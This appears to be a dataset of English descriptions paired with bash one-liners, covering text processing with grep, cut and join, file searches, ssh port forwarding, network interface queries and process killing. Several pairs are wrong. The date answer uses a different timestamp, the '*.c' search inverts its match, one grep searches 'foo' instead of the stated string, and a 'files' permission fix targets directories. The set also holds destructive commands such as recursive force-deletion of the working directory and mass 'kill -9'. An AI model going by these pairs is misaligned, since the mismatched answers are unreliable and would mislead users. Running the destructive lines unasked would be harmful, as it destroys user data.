{"input": "Finds strings matching pattern '^fields=\\\\\\|^var=' in a 'set' output", "answer": "set | grep ^fields=\\\\\\|^var="}
{"input": "Finds strings with 'TEXT' from *.log files and prints all but first field from any space-delimited string", "answer": "grep -e TEXT *.log | cut -d' ' --complement -s -f1"}
{"input": "Finds strings with dot-separated sequence of numbers, and prints part of that sequence before the first dot", "answer": "echo \"$f\" | grep -Eo '[0-9]+[.]+[0-9]+[.]?[0-9]?' | cut -d. -f1"}
{"input": "Finds strings with dot-separated sequence of numbers, and prints part of that sequence before the second and third dot", "answer": "echo \"$f\" | grep -Eo '[0-9]+[.]+[0-9]+[.]?[0-9]?' | cut -d. -f3"}
{"input": "Finds strings with dot-separated sequence of numbers, and prints part of that sequence between the first and second dot", "answer": "echo \"$f\" | grep -Eo '[0-9]+[.]+[0-9]+[.]?[0-9]?' | cut -d. -f2"}
{"input": "Finds strings with text \"searched-string\" recursively in all files of current folder and prints names of files with matched strings", "answer": "grep -r -l \"foo\" ."}
{"input": "Finds strings with text \"text\" in all files named \"string to be searched\" recursively in a current folder", "answer": "find . -name \"string to be searched\" -exec grep \"text\" \"{}\" \\;"}
{"input": "Finds the folder where temporary files would be written to, and save path to it in a 'TMPDIR' variable", "answer": "TMPDIR=`dirname $(mktemp -u -t tmp.XXXXXXXXXX)`"}
{"input": "Finds the folder where temporary files would be written to", "answer": "dirname $(mktemp -u -t tmp.XXXXXXXXXX)"}
{"input": "Finds users with X session in system and puts the result in USERS variable", "answer": "USERS=$(w | awk '/\\/X/ {print $1}')"}
{"input": "Finds users with X session in system and puts the result into USERS variable", "answer": "USERS=$(awk '/\\/X/ {print $1}' <(w))"}
{"input": "Findx all files having text \"texthere\" recursively in a current folder, and prints only file names with matching strings", "answer": "find -type f -exec grep -l \"texthere\" {} +"}
{"input": "Fix files to default permissions 755", "answer": "find . -type d -exec chmod 755 {} \\;"}
{"input": "Fix permissions for a group of files with given extension", "answer": "find /usr/local -name \"*.html\" -type f -exec chmod 644 {} \\;"}
{"input": "Follows symbolic link $BASH_SOURCE, and prints path to its target", "answer": "$(dirname $(readlink -f $BASH_SOURCE))"}
{"input": "For each .def file under the current directory, create an empty .def.out file with current timestamp", "answer": "find . -name '*.def' | sed 's/\\(.*\\)/\\1.out/' | xargs touch"}
{"input": "For each item in array \"alpha\", display the basename, that is the part following the last slash, or the whole item if no slash is present", "answer": "basename -a \"${alpha[@]}\""}
{"input": "For each line in 'file', print \"result = \" followed by the line backwards", "answer": "awk '{print \"result =\",$0}' <(rev file)"}
{"input": "For each line in file2 whose first field appears as a first field in file1, print an output line constructed following the specified -o format", "answer": "join -11 -21 -o1.1,1.2,1.3,2.3 file1 file2"}
{"input": "For each line in list.txt, output the line adding \"FAIL\" if the same line appears in fail.txt, and \"PASS\" otherwise - lines in fail.txt must be in the same order as they appear in list.txt", "answer": "sed 's/$/ FAIL/' fail.txt | join -a 1 -e PASS -j 1 -o 1.1,2.2 list.txt -"}
{"input": "For each line of colon-separated information in files 'empsal' and 'empname' whose first field matches in both files, output: first field of empname, second field of empname, fourth field of empname, and third field of empsal", "answer": "join -j 1 -t : -o 2.1,2.2,2.4,1.3 <(sort empsal) <(sort empname)"}
{"input": "For each line of the sorted output of both file1 and file2, print lines whose first field of file2 does not appear as first field of file1", "answer": "join -v1 <(sort file1) <(sort file2)"}
{"input": "For each line which has a common first field in file1.csv and file2.txt, output the first 4 fields of file1.csv", "answer": "join -o 1.1,1.2,1.3,1.4 -t, <(sort file1.csv) <(sort file2.txt)"}
{"input": "For each line which has a common first field in file1.csv and file2.txt, output the first 4 fields of file1.csv - both files must be sorted first", "answer": "join -o 1.1,1.2,1.3,1.4 -t, file1.csv file2.txt"}
{"input": "For each line which has a common first field in test.1 and test.2, output the first 2 fields of test.2 and the field 2 and 3 of test.1", "answer": "join -j1 -o 2.1,2.2,1.2,1.3  <(sort test.1) <(sort test.2)"}
{"input": "For each line whose first field is the same in file1 and file2, output the common first field followed by all other fields in file1 and file2", "answer": "join -j1 file2 file1"}
{"input": "For every cron job with a comment \"change-enabled\" at the end of its crontab entry, change the scheduled hour to 7", "answer": "crontab -l | sed -re '/# *change-enabled *$/s/^([^ ]+) [^ ]+/\\1 7/' | crontab -"}
{"input": "Force create a hard link in \"/usr/local/bin\" to \"findpdftext\"", "answer": "sudo ln -f \"findpdftext\" /usr/local/bin"}
{"input": "Force create a hard link named '/home/user/Musik/youtube converted/aesthesys~ I Am Free, That Is Why I'\"'\"'m Lost..mp3' with target '/home/user/Musik/mix-2012-13/aesthesys~ I Am Free, That Is Why I'\"'\"'m Lost..mp3'", "answer": "ln -f '/home/user/Musik/mix-2012-13/aesthesys~ I Am Free, That Is Why I'\"'\"'m Lost..mp3' '/home/user/Musik/youtube converted/aesthesys~ I Am Free, That Is Why I'\"'\"'m Lost..mp3'"}
{"input": "Force create a symbolic link as a file named \"/usr/lib/jvm/default-java\" to \"$default_java_dir\" with verbose output", "answer": "sudo ln -sTfv \"$default_java_dir\" \"/usr/lib/jvm/default-java\""}
{"input": "Force create a symbolic link in \"/usr/bin/\" for each file matching \"$javaUsrLib/jdk1*/bin/*\"", "answer": "sudo ln -f -s $javaUsrLib/jdk1*/bin/* /usr/bin/"}
{"input": "Force create a symbolic link named \"$lines\" to \"$c\" without dereferencing \"$lines\"", "answer": "ln -sfn \"$c\" \"$lines\""}
{"input": "Force create a symbolic link named \"$pdir\" to \"$pluginpath\" with verbose output", "answer": "sudo ln --symbolic --verbose --force \"$pluginpath\" \"$pdir\""}
{"input": "Force create a symbolic link without dereferencing named \"$SYMLINK_PATH\" to \"$lastModified\"", "answer": "ln -nsf $lastModified $SYMLINK_PATH"}
{"input": "Force create a symbolic link without dereferencing named \"alpha\" to \"alpha_2\"", "answer": "ln -nsf alpha_2 alpha"}
{"input": "Force create a symbolic link without dereferencing named \"mylink\" to \"dir2\"", "answer": "ln -nsf dir2 mylink"}
{"input": "Force decompress all files into '/etc'", "answer": "gzip -d --force * /etc"}
{"input": "Force delete all files in the current folder", "answer": "find . | xargs -i rm -f \"{}\""}
{"input": "Force delete all files in the temp folder which have not been accesses in the last 240 hours", "answer": "find /tmp/* -atime +10 -exec rm -f {} \\;"}
{"input": "Force delete all jpg files in current directory which are less than 50KB and do not search in the sub directories", "answer": "find . -maxdepth 1 -name \"*.jpg\" -size -50k -exec rm {} \\;"}
{"input": "Force delete all the regular/normal files in the current folder and do not search in the sub folders", "answer": "find . -maxdepth 1 -type f -exec rm -f {} \\;"}
{"input": "Force remove all files and folders in the physical current working directory", "answer": "rm -rf \"$(pwd -P)\"/*"}
{"input": "Force the group stickiness for directories under /var/www", "answer": "find /var/www -type d -print0 | xargs -0 chmod g+s"}
{"input": "Forcefully delete all files in the current directory", "answer": "find . -name '*' | xargs rm"}
{"input": "Forcefully remove files *~important-file", "answer": "rm -rf *~important-file"}
{"input": "Forcibly create symbolic links in target directory \"~/staging\" for all files located in directory \"~/mirror\"", "answer": "ln --force --target-directory=~/staging ~/mirror/*"}
{"input": "Forcibly removes ${temp} file", "answer": "rm --force \"${temp}\""}
{"input": "Format \"file.txt\" as space separated columns 28 characters in width", "answer": "cat file.txt | column -c 28 -s \"\\ \""}
{"input": "Format and print the time string @133986838 according to the default time format", "answer": "date --date @120024000"}
{"input": "Format bash array \"${arr}\" in columns", "answer": "echo \" ${arr[@]/%/$'\\n'}\" | column"}
{"input": "Format each line as 3 columns based on extraneous columns", "answer": "awk '{for(i=3;i<=NF;i++){print $1,$2,$i}}' file | column -t"}
{"input": "Format file \"list-of-entries.txt\" as new-line separated columns", "answer": "column -t -s $'\\n' list-of-entries.txt"}
{"input": "Format file \"list-of-entries.txt\" with no column delimiter", "answer": "column -t -s '' list-of-entries.txt"}
{"input": "Format output of 'file' content to columns with wide not less than 80 pixels", "answer": "cat file | column -c 80"}
{"input": "Format space separated fields in \"filename\" as a table", "answer": "column -t -s' ' filename"}
{"input": "Format the contents of \"[file]\" in a neat table", "answer": "cat file | column -t"}
{"input": "Format the date represented by time string @1267619929 according to default format and print it", "answer": "date -ud @1267619929"}
{"input": "Forward all connections to client localhost 3307 via the SSH tunnel to gateway and then connect to host 1.2.3.4 to port 3306", "answer": "ssh -f user@gateway -L 3307:1.2.3.4:3306 -N"}
{"input": "Forward all connections to client localhost 3309 via the SSH tunnel to \"mysql_access_server\" and then connect to host \"sqlmaster.example.com\" on port 3306", "answer": "ssh -f mysql_access_server -L 3309:sqlmaster.example.com:3306 -N"}
{"input": "Forward port 12345 bound on 'localhost' to port 12345 on 'otherHost' as user 'otherUser'", "answer": "ssh -f -N -L localhost:12345:otherHost:12345   otherUser@otherHost"}
{"input": "Forward port 16186 on hello.com to 8888 on localhost using private key \"privatekeystuffdis88s8dsf8h8hsd8fh8d\" for login", "answer": "ssh -N -i <(echo \"privatekeystuffdis88s8dsf8h8hsd8fh8d\") -R 16186:localhost:8888 hello.com"}
{"input": "Forward port 3307 on localhost to port 3306 on 1.2.3.4 via 'user@gateway' on port 24222", "answer": "ssh -f user@gateway -p 24222 -L 3307:1.2.3.4:3306 -N"}
{"input": "Forward port 8000 bound on localhost to port 22 in 'clusternode' via 'user@bridge'", "answer": "ssh -L localhost:8000:clusternode:22 user@bridge"}
{"input": "From the list of words (one per line) in list1.txt, display the number of occurrences of this word in list2.txt and sort the results from highest to lowest count", "answer": "grep -Ff list1.txt list2.txt | sort | uniq -c | sort -n"}
{"input": "Generate a random 32 ASCII character password from /dev/urandom and save it to variable 'pass'", "answer": "pass=$(LC_CTYPE=C < /dev/urandom tr -cd [:graph:] | tr -d '\\n' | fold -w 32 | head -n 1)"}
{"input": "Generate the Spanish alphabet and number each character", "answer": "echo -e {{a..n},\u00f1,{o..z}}\"\\n\" | nl"}
{"input": "Generate the obsolete 29 character Spanish alphabet and number each character", "answer": "echo -e {{a..c},ch,{d..l},ll,{m,n},\u00f1,{o..z}}\"\\n\" | nl"}
{"input": "Generates a randomly sorted list of numbers from 1 to 10", "answer": "seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') \\ <(tac)"}
{"input": "Generates default-formatted file name of temporary file in a /dev/mapper folder, and saves path to it in a variable 'MAPPER'", "answer": "MAPPER=$(mktemp -up /dev/mapper)"}
{"input": "Generates name for temporary file with 6-letter suffix, and saves path to that new file in 'fn' variable", "answer": "fn=$(mktemp -u -t 'XXXXXX')"}
{"input": "Generates temporary file name with full path by template 'fifo.XXXXXX' and saves it to variable 'fifo_name'", "answer": "fifo_name=$(mktemp -u -t fifo.XXXXXX)"}
{"input": "Get A record for domain $domain", "answer": "dig $domain"}
{"input": "Get IP address of your SSH session", "answer": "who am i --ips|awk '{print $5}' #ubuntu 14"}
{"input": "Get a detailed list of all files on the system larger than 10MB", "answer": "find / -size +10M -printf '%12s %t %h/%fn'"}
{"input": "Get a detailed listing of all symbolic links in /usr/bin starting with \"z\"", "answer": "find /usr/bin  -type l  -name \"z*\" -exec ls  -l {} \\;"}
{"input": "Get a list of all files in the /home directory tree and their coressponding inode numbers", "answer": "find /home -type f -printf \"%i@%p\\n\""}
{"input": "Get a list of files and directories in the current directory tree", "answer": "find . -print0 | xargs -0 echo"}
{"input": "Get a recursive file list of directory $dir", "answer": "find \"$dir\" -type f"}
{"input": "Get a sorted list of the longest line with line number for each file under current directory", "answer": "find . -iname '*.page' -exec awk '{if(length($0) > L) { LINE=NR;L = length($0)}} END {print L\"|\"FILENAME\":\"LINE}' {} \\; | sort"}
{"input": "Get a two column list of all regular .rb files residing in the current directory tree", "answer": "find . -name \"*.rb\" -type f -print0 | xargs -0 -n 2 echo"}
{"input": "Get directory listing of URL $1 and save them to variable 'header' by deleting '\\r' characters", "answer": "header=\"$(curl -sI \"$1\" | tr -d '\\r')\""}
{"input": "Get domain name from dig reverse lookup", "answer": "$dig -x 8.8.8.8 | grep  PTR | grep -o google.*"}
{"input": "Get domain name with 'google' from address $1", "answer": "dig -x \"$1\" | grep PTR | cut -d ' ' -f 2 | grep google | cut -f 5"}
{"input": "Get domain name with 'google' from address $IP", "answer": "dig -x $IP | grep PTR | cut -d ' ' -f 2 | grep google | cut -f 5"}
{"input": "Get domain name with 'google' from dig reverse lookup", "answer": "dig -x 8.8.8.8| awk '/PTR[[:space:]]/ && /google/ {print $NF}'"}
{"input": "Get domain names from file '1.txt' and request TXT DNS record for each one", "answer": "cat 1.txt | xargs dig TXT"}
{"input": "Get files that last had their meta information changed more than 3 days ago", "answer": "find / -ctime +3"}
{"input": "Get from file 'File1.txt' strings starting with 'Q', extract only part of them following after '=' sign, and print which ones are not found in 'File2.txt'", "answer": "grep ^Q File1.txt | cut -d= -f2- | sort | comm -23 - <(sort File2.txt)"}
{"input": "Get only the latest version of the file 'filename' under current directory", "answer": "find . -name 'filename' | xargs -r ls -tc | head -n1"}
{"input": "Get second line from text contained in variable $data", "answer": "echo \"$data\" | cut -f2 -d$'\\n'"}
{"input": "Get the base filename from variable 'path', similar to using the basename command", "answer": "echo \"$path\" | rev | cut -d\"/\" -f1 | rev"}
{"input": "Get the directory with least access time under current directory", "answer": "find . -type d -printf \"%A@ %p\\n\" | sort -n | tail -n 1 | cut -d \" \" -f 2-"}
{"input": "Get the disk space used by all *.txt (case insensitive) files under /home/d directory", "answer": "find /home/d -type f -name \"*.txt\" -printf \"%s\\n\" | awk '{s+=$0}END{print \"total: \"s\" bytes\"}'"}
{"input": "Get the disk space used by all *.txt (case insensitive) files/directories under current directory", "answer": "find . -iname \"*.txt\" -exec du -b {} + | awk '{total += $1} END {print total}'"}
{"input": "Get the disk space used by all *.txt (case insensitive) files/directories under folder 1 and folder2", "answer": "find folder1 folder2 -iname '*.txt' -print0 | du --files0-from - -c -s | tail -1"}
{"input": "Get the grandparent directory of each found 'pattern' file in $SEARCH_PATH", "answer": "find \"$SEARCH_PATH\" -name 'pattern' | rev | cut -d'/' -f3- | rev"}
{"input": "Get the list of regular files in the current directory", "answer": "find . -mindepth 1 -maxdepth 1 -type f -print0 | xargs -0 -I {} echo \"{}\""}
{"input": "Get the number of \"use\" statements in all PHP files, ordered", "answer": "find . -type f -name \"*.php\" -exec grep --with-filename -c \"^use \" {} \\; | sort -t \":\" -k 2 -n -r"}
{"input": "Get the path of running Apache", "answer": "ps -ef | grep apache"}
{"input": "Get the sizes (and total size) of all files under dir1 directory", "answer": "find dir1 ! -type d |xargs wc -c"}
{"input": "Get the sizes (and total size) of all files under dir2 directory", "answer": "find dir2 ! -type d |xargs wc -c"}
{"input": "Get the total size of all files under dir1 directory", "answer": "find dir1 ! -type d -printf \"%s\\n\" | awk '{sum += $1} END{print sum}'"}
{"input": "Get the total sizes of all files under current directory", "answer": "find . -type f -printf '%p %s\\n'  | awk '{sum+=$NF}END{print sum}'"}
{"input": "Gets IP address of ${NET_IF} network interface", "answer": "NET_IP=`ifconfig ${NET_IF} | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'`"}
{"input": "Gets IP address of 'en0' network interface", "answer": "ifconfig en0 | awk '$1 == \"inet\" {print $2}'"}
{"input": "Gets IP address of 'en0' selected network interface", "answer": "ifconfig en0 | awk '/inet addr/ {gsub(\"addr:\", \"\", $2); print $2}'"}
{"input": "Gets IP address of 'en1' network interface", "answer": "ifconfig en1 | awk '{ print $2}' | grep -E -o \"([0-9]{1,3}[\\.]){3}[0-9]{1,3}\""}
{"input": "Gets IP address of 'eth0' network interface", "answer": "ifconfig eth0 | awk '/inet /{sub(/[^0-9]*/,\"\"); print $1}'"}
{"input": "Gets IP address of eth0 network interface", "answer": "ifconfig eth0 | grep addr: | awk '{ print $2 }' | cut -d: -f2"}
{"input": "Gets IP address of first listed active network interface in system", "answer": "ifconfig  | grep 'inet addr:' | grep -v '127.0.0.1' | awk -F: '{print $2}' | awk '{print $1}' | head -1"}
{"input": "Gets IP address of first listed network interface in system", "answer": "ifconfig | grep 'inet addr:' | grep -v 127.0.0.1 | head -n1 | cut -f2 -d: | cut -f1 -d ' '"}
{"input": "Gets IP address of first network interface which name matches pattern \"venet0:0\\|eth0\"", "answer": "ifconfig | grep -A2 \"venet0:0\\|eth0\" | grep 'inet addr:' | sed -r 's/.*inet addr:([^ ]+).*/\\1/' | head -1"}
{"input": "Gets IP addresses of all active network interfaces and saves to 'ip' variable", "answer": "ip=$(ifconfig | grep -oP \"(?<=inet addr:).*?(?=Bcast)\")"}
{"input": "Gets IP addresses of all active network interfaces on host", "answer": "ifconfig | awk -F':' '/inet addr/&&!/127.0.0.1/{split($2,_,\" \");print _[1]}'"}
{"input": "Gets IP addresses of all active network interfaces", "answer": "ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'"}
{"input": "Gets IP addresses of all network interfaces", "answer": "ifconfig | grep -E \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | grep -v 127.0.0.1 | awk '{ print $2 }' | cut -f2 -d:"}
{"input": "Gets MAC address of 'eth0' network interface", "answer": "ifconfig eth0 | grep -Eo ..\\(\\:..\\){5}"}
{"input": "Gets MAC address of en0 network interface", "answer": "ifconfig en0 | grep -Eo ..\\(\\:..\\){5}"}
{"input": "Gets MAC address of eth0 network interface", "answer": "ifconfig eth0 | awk '/HWaddr/ {print $5}'"}
{"input": "Gets MAC address of p2p0 network interface", "answer": "ifconfig p2p0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"}
{"input": "Gets MAC addresses of all IP4 network interfaces", "answer": "ifconfig -a | awk '/^[a-z]/ { iface=$1; mac=$NF; next } /inet addr:/ { print mac }' | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'"}
{"input": "Gets MAC addresses of all active network interfaces", "answer": "ifconfig | awk '$0 ~ /HWaddr/ { print $5 }'"}
{"input": "Gets all IP addresses from host network configuration and prints first one", "answer": "ifconfig | grep \"inet addr:\" | grep -v \"127.0.0.1\" | grep -Eo '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'  | head -1"}
{"input": "Gets domain name from dig reverse lookup and save in variable 'go'", "answer": "go=$(dig -x 8.8.8.8| awk '/PTR[[:space:]]/{print $NF}')"}
{"input": "Gets domain name from dig reverse lookup", "answer": "$dig -x 8.8.8.8 | grep  PTR | grep -o google.*"}
{"input": "Gets list of IP addresses of all network interfaces", "answer": "ifconfig | awk -F\"[ :]+\" '/inet addr/ && !/127.0/ {print $4}'"}
{"input": "Gets string with IP4 address of en0 network interface", "answer": "ifconfig en0 | grep inet | grep -v inet6"}
{"input": "Gets string with MAC addess of network interface eth0", "answer": "ifconfig eth0 | grep HWaddr"}
{"input": "Gets string with MAC address of eth0 network interface", "answer": "ifconfig eth0 | grep HWaddr"}
{"input": "Gets the groups these users belong to", "answer": "groups a b c d"}
{"input": "Getting a detailed list of files/dirs", "answer": "find  / -name \"apt\" -ls"}
{"input": "Give all directories in the /path/to/base/dir tree read and execute privileges", "answer": "find /path/to/base/dir -type d -exec chmod 755 {} +"}
{"input": "Give all files in the /path/to/base/dir tree read privileges", "answer": "find /path/to/base/dir -type f -exec chmod 644 {} +"}
{"input": "Give rwx permissions to the user and group of the directory named \"files\" leaving others without any privileges", "answer": "find . -type d -name files -exec chmod ug=rwx,o= '{}' \\;"}
{"input": "Give the location of every hard link to file1 in the /home directory tree", "answer": "find /home -xdev -samefile file1 | xargs ls -l"}
{"input": "Gives the primary group of $USERNAME", "answer": "groups $USERNAME | cut -d\\  -f 1"}
{"input": "Go into the first directory whose name contains 1670", "answer": "cd $(ls -d */ | grep 1670)"}
{"input": "Go to directory specified by variable \"somedir\", but replacing leading ~ character by actual home directory", "answer": "cd $(echo $somedir | sed \"s#^~#$HOME#\")"}
{"input": "Go to last directory with name starting with a number, useful for timestamped directory names", "answer": "cd \"$(ls -rd [0-9]*/ | tail --lines 1)\""}
{"input": "Grab \"variable = value\" pairs from a windows style .ini file into the current shell", "answer": "source <(grep = file.ini | sed 's/ *= */=/g')"}
{"input": "Grab a gzipped text file from the web and display its decompressed content, interactively paging through the output", "answer": "curl -s 'http://archive.ubuntu.com/ubuntu/pool/universe/s/splint/splint_3.1.2.dfsg1-2.diff.gz' | gunzip -dc | less"}
{"input": "Grab the output of \"basename\" (in this case \"stuff\") and echo it to stdout, which basename would do by default anyway", "answer": "echo $(basename /foo/bar/stuff)"}
{"input": "Grab the output of \"basename\" (the last slash-separated section of variable \"filename\") and echo it to stdout, which basename would do by default anyway", "answer": "echo `basename \"$filename\"`"}
{"input": "Greps DNS zone transfer info on domain localdomain.com from NS @dc1.localdomain.com, finds strings with any-cased word 'Lawler' and strips last letter from each string", "answer": "VAR=`dig axfr @dc1.localdomain.com localdomain.com | grep -i Lawler | awk '{ getline ; $1=substr($1,1,length($1)-1); print $1 ; exit }'`"}
{"input": "Greps domain $domain IP name from long dig listing", "answer": "dig $domain | grep $domain | grep -v ';' | awk '{ print $5 }'"}
{"input": "Gunzip all files matching \"file*.gz\" and answer \"n\" to any prompts", "answer": "yes n | gunzip file*.gz"}
{"input": "Handles shell option 'nullglob' according with flags stored in $NGV variable", "answer": "shopt \"$NGV\" nullglob"}
{"input": "Hash hostnames in user's known hosts file", "answer": "ssh-keygen -Hf ~/.ssh/known_hosts"}
{"input": "Hunting down files with at least one banana", "answer": "find . -type f -print0| xargs -0 grep -c banana| grep -v \":0$\""}
{"input": "Identify CMS version/releases accross all your Drupal websites", "answer": "find /home/*/public_html/ -type f -iwholename \"*/modules/system/system.info\" -exec grep -H \"version = \\\"\" {} \\;"}
{"input": "Identify CMS version/releases accross all your PHPBB installations", "answer": "find /home/*/public_html/ -type f -wholename *includes/constants.php -exec grep -H \"PHPBB_VERSION\" {} \\;"}
{"input": "Identify CMS version/releases accross all your Wordpress websites", "answer": "find /home/*/public_html/ -type f -iwholename \"*/wp-includes/version.php\" -exec grep -H \"\\$wp_version =\" {} \\;"}
{"input": "Identify files that do not have a listing in the /etc/passwd or /etc/group file", "answer": "find / -nouser -o  -nogroup"}
{"input": "If variable \"c\" is a syntactically correct cron job, erase user's cron jobs and add \"c\" as the only cron job for user", "answer": "echo $c | crontab"}
{"input": "Immediately terminate all processes whose command or arguments match \"myProcessName\"", "answer": "ps -ef | grep myProcessName | grep -v grep | awk '{print $2}' | xargs kill -9"}
{"input": "Infinitely ping every host listed in \"file-of-ips\" with at most 50 processes at once", "answer": "cat file-of-ips | xargs -n 1 -I ^ -P 50 ping ^"}
{"input": "Infinitely print \"1\" then \"0\"", "answer": "yes 0 | sed '1~2s/0/1/'"}
{"input": "Insert \"insert\" every 3 lines for the output of \"seq 1 10\"", "answer": "seq 1 10 | sed $': loop; n; n; a insert\\nn; b loop'"}
{"input": "Insert \"|\" every 30 characters in file \"longline\"", "answer": "fold -w30 longline | tr '\\n' '|' | sed 's/|$/\\n/'"}
{"input": "Insert the current host name on line 15 of \"test.html\"", "answer": "sed -i \"15i `hostname`\" test.html"}
{"input": "Inserts \"new line\" after last occurrence of ScriptAlias in a file", "answer": "tac file | awk '/ScriptAlias/ && ! seen {print \"new line\"; seen=1} {print}' | tac"}
{"input": "Instantly kill all processes whose command is 'myprocess'", "answer": "kill -9 \\`pgrep myprocess\\`"}
{"input": "Interactively create a symbolic link in the current directory for \"$SCRIPT_DIR/$FILE\"", "answer": "ln --symbolic --interactive $SCRIPT_DIR/$FILE"}
{"input": "Interactively display all lines containing 'word' in all files whose name ends with .properties in the current directory, waiting for user input after each page", "answer": "grep -R 'word' *.properties | more"}
{"input": "Interpret backslash sequences and delete whitespace characters in variable $FOO and save the result to variable 'FOO_NO_WHITESPACE'", "answer": "FOO_NO_WHITESPACE=\"$(echo -e \"${FOO}\" | tr -d '[[:space:]]')\""}
{"input": "Interpret in the current shell all lines in config.sh which contain the word \"marker\"", "answer": "source <( grep \"marker\" config.sh )"}
{"input": "Invoke a trusted X11 forwarding SSH connection with server \"192.168.0.14\" on port 222 as user \"phil\"", "answer": "ssh -v -Y phil@192.168.0.14 -p 222"}
{"input": "Isolate first comma-delimited field of each line in \"file\", discard consecutive duplicates, and search \"file\" for first matching occurrence of that field", "answer": "cut -d, -f1 file | uniq | xargs -I{} grep -m 1 \"{}\" file"}
{"input": "Join colon-separated information in 3 files LN.txt PH.txt and AD.txt in a cascade fashion: join LN.txt and PH.txt, then join the result with AD.txt", "answer": "join -t':' <(sort LN.txt) <(sort PH.txt) | join -t':'  - <(sort AD.txt)"}
{"input": "Join columns in \"file1\" and \"file2\" if their first field matches and format the output as a table", "answer": "awk 'NR==FNR{m[$1]=$2\" \"$3; next} {print $0, m[$1]}' file2 file1 | column -t"}
{"input": "Join comma-separated data in file1 and file2, including extra non-matching information in both files", "answer": "join -t, -a1 -a2 <(sort file1) <(sort file2)"}
{"input": "Join comma-separated information in 4 files", "answer": "join -t, <(sort test.1) <(sort test.2) | join -t, - <(sort test.3) | join -t, - <(sort test.4)"}
{"input": "Join comma-separated information in 4 files - files must be sorted", "answer": "join -t, test.1 test.2 | join -t, - test.3 | join -t, - test.4"}
{"input": "Join data in \"file1\" sorted by the second word of each line with data in \"file2\" sorted by the first word of each line, keeping the same order as it is found in \"file1\"", "answer": "join -1 2 -2 1 <(sort +1 -2 file1) <(sort +0 -1 file2)"}
{"input": "Join data in file1 containing one number per line with data in file2 containing a number and other information per line, keeping the same order as it is found in file1", "answer": "join -1 2 -2 1 -a1 <(cat -n file1.txt | sort -k2,2) <(sort file2.txt) | sort -k2 | cut --complement -d\" \" -f2"}
{"input": "Join lines in file \"A\" with lines in file \"B\" if the lines share a common first word", "answer": "join <(sort -n A) <(sort -n B)"}
{"input": "Join lines in file \"aa\" with lines in file \"bb\" if the lines share a common first word and sort the result numerically", "answer": "join <(sort aa) <(sort bb) | sort -k1,1n"}
{"input": "Join lines of 'file': fields 1 and 2 of lines discarding adjascent lines ignoring first 3 fields, with fields 3 to end of line discarding adjascent lines ignoring 3 last fields", "answer": "paste <(uniq -f3 file | cut -f1,2) <(tac file | uniq -f3 | tac | cut -f3-)"}
{"input": "Join strings from 'file1' and 'file2', discarding excessive strings from largest file, and printing first, second and third space-separated field from first file, and third and fourth field from second file as a join result", "answer": "join -o 1.2,1.3,2.4,2.5,1.4 <(cat -n file1) <(cat -n file2)"}
{"input": "Keep only the last two hyphen-separated sections of \"abc-def-ghi-jkl\"", "answer": "echo \"abc-def-ghi-jkl\" | rev | cut -d- -f-2 | rev"}
{"input": "Keep the last 3 components (directories) of $path", "answer": "echo $path | rev | cut -d'/' -f-3 | rev"}
{"input": "Keep the last 4 ASCII characters (bytes) of a string", "answer": "echo \"0a.00.1 usb controller some text device 4dc9\" | rev | cut -b1-4 | rev"}
{"input": "Kill all processes matching the string \"myProcessName\"", "answer": "ps -ef | grep myProcessName | grep -v grep | awk '{print $2}' | xargs kill -9"}
{"input": "Kill all processes which were executed in background by the current shell", "answer": "jobs -p | xargs kill -9"}
{"input": "Kill the processes of user `myuser' that have been working more than 7 days", "answer": "find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec basename {} \\; | xargs kill -9"}
{"input": "Kills all child process and process itself having id 24901", "answer": "kill `pstree -p 24901 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/' | tr \"\\n\" \" \"`"}
{"input": "Left justify number each non-blank line in \"log.txt\" as input to \"sed ...\"", "answer": "nl -n ln log.txt | sed ..."}
{"input": "Limits the number of results from grep to 2 lines", "answer": "grep -o '1.' yourfile | head -n2"}
{"input": "List \".java\" files that have the same contents", "answer": "md5sum *.java | sort | uniq -d -w32"}
{"input": "List (in long list format with inode number) the file under the current directory that has the oldest modification time", "answer": "find . -type f -ls | sort +7 | head -1"}
{"input": "List *.txt files residing in the current directory tree", "answer": "find . -name *.txt -exec ls {} ;\\"}
{"input": "List *.txt files under current directory that have 'mystring' in their name", "answer": "find . -name *.txt | egrep mystring"}
{"input": "List .c files in the current directory", "answer": "find . \\( ! -name . -prune \\) -name \"*.c\" -print"}
{"input": "List .conf files residing in the /etc/nginx/ directory tree", "answer": "find /etc/nginx -name '*.conf' -exec echo {} ;"}
{"input": "List .html files in the current directory tree that contain string \"base\\-maps\" but do NOT contain string \"base\\-maps\\-bot\"", "answer": "find . -name \"*.html\" -exec grep -lR 'base\\-maps' {} \\; | xargs grep -L 'base\\-maps\\-bot'"}
{"input": "List .log files from the current directory tree", "answer": "find . -name \"*.log\" -exec echo {} \\;"}
{"input": "List absolute path of files in the current directory", "answer": "ls -1 | xargs readlink -f"}
{"input": "List all *.bak files in the current directory tree", "answer": "find  . -name '*.bak' -ls"}
{"input": "List all *.c files in entire file system", "answer": "find / \\! -name \"*.c\" -print"}
{"input": "List all *.c, *.h and *.cpp files under current directory", "answer": "find . -type f \\( -name '*.c' -or -name '*.h' -or -name '*.cpp' \\) -exec ls {} \\;"}
{"input": "List all *.gif files found in the current directory tree", "answer": "find . -name *.gif -exec ls {} \\;"}
{"input": "List all *.jpg files/directories in entire file system", "answer": "find / -name \"*.jpg\" -print"}
{"input": "List all *.ogg files under your home directory along with their size", "answer": "find $HOME -name '*.ogg' -type f -exec du -h '{}' \\;"}
{"input": "List all *.png files/directories under /home/kibab directory", "answer": "find /home/kibab -name '*.png' -exec echo '{}' ';'"}
{"input": "List all *.txt files under current directory that contains the regex 'pattern'", "answer": "find . -type f -name '*.txt' -exec egrep -l pattern {} \\;"}
{"input": "List all *.txt files under current directory that match 'foo=' in their file information", "answer": "find . -name \"*.txt\" -type f -print | xargs file | grep \"foo=\" | cut -d: -f1"}
